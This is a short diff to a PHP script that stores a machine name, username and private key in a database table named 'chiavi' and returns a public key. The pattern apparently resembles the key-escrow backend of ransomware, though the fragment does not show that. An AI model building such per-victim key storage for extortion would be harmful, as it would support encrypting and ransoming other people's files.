@@ -22,15 +22,12 @@ $pcname = $_POST['pcname'];
 $username = $_POST['username']; 
 
 include 'db.php';
-$stmt = $connection->prepare('INSERT INTO dummy (pcname, username, privatekey) VALUES (?, ?, ?)');
+$stmt = $connection->prepare('INSERT INTO chiavi (pcname, username, privatekey) VALUES (?, ?, ?)');
 
 $stmt->execute([
 	$pcname,
 	$username,
 	$privatekey
 ]);
-
-
-//var_dump($privatekey);
 
 echo $publickey;
